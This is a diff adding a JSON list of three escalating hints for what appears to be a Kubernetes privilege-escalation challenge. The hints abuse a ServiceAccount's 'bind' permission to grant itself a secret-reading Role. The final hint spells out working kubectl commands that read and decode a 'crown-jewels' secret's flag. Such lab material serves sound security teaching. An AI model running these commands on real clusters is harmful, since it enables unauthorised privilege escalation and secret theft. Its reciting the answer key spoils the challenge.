@@ -1,0 +1,5 @@
+[
+  "Impersonate the ServiceAccount on every command: `--as=system:serviceaccount:dojo-esc:dev`. First audit what it can do — `kubectl auth can-i --list -n dojo-esc --as=system:serviceaccount:dojo-esc:dev`. You'll see it can create rolebindings and `bind` the `secret-reader` Role, but cannot read secrets. That gap is the whole puzzle.",
+  "You don't need to read the Secret as yourself — you need to *grant yourself* the Role that can. The `secret-reader` Role already exists; it just isn't bound to `dev`. Create a RoleBinding (as `dev`) that binds `secret-reader` to `dev`. The API server allows it because `dev` holds the `bind` verb on that Role, even though `dev` can't read secrets itself.",
+  "`kubectl -n dojo-esc create rolebinding dev-self-escalation --role=secret-reader --serviceaccount=dojo-esc:dev --as=system:serviceaccount:dojo-esc:dev`, then `kubectl -n dojo-esc get secret crown-jewels -o jsonpath='{.data.FLAG}' --as=system:serviceaccount:dojo-esc:dev | base64 -d`."
+]
